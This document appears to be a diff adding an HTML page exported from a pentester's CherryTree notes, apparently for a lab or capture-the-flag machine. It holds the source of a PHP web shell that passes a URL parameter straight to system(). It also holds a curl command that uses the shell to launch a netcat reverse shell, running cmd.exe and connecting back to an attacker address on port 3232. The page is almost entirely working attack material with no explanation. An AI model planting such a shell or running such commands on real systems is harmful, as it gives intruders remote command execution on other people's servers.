@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>html webshell</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>html webshell</h1><br/>&lt;HTML&gt;&lt;BODY&gt;<br />&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;<br />&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;<br />&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;<br />&lt;/FORM&gt;<br />&lt;pre&gt;<br />&lt;?php<br />if($_GET[&#39;cmd&#39;]) {<br />      system($_GET[&#39;cmd&#39;]);<br />        }<br />?&gt;<br />&lt;/pre&gt;<br />&lt;/BODY&gt;&lt;/HTML&gt;<br /><br /><br /><br />curl <a href="http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232">http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232</a></div></body></html>
